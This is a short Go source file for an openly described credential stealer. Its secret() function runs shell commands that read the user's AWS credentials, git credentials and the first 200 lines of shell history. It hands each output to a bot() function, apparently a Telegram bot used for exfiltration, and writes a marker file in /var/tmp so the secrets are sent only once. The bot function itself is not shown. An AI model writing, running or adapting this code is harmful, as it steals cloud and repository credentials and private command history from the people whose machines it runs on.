

//get secrets and files  and send by bot 

package main



import (

//"fmt"
"os"
"os/exec"
)



func secret(){

secret_files :=  [] string{

"cat $HOME/.aws/credentials",
"cat $HOME/.git-credentials",      
"cat $HOME/.bash_history | head -n 200",  //send  only 200 bytes because limitation by bot of telegram

}



//check file secret_send_ok.atila  
      
//if exists return 

_, err_op := os.Open("/var/tmp/.secret_send_ok") 

if err_op == nil { return }  //secrets  if exits are   send bot ok  
  



for  sf := 0; sf < 3; sf++{

secre  := exec.Command("sh" , "-c" , secret_files[sf])

out , err_secret := secre.CombinedOutput()
 
if err_secret != nil { return }

out_str := string(out)

bot(out_str)
 
sinalize := exec.Command("sh" , "-c" , "truncate -s 0  /var/tmp/.secret_send_ok")
 
sinalize.Run()

//sinalize the secret  area send in  machine not repeter


}


}





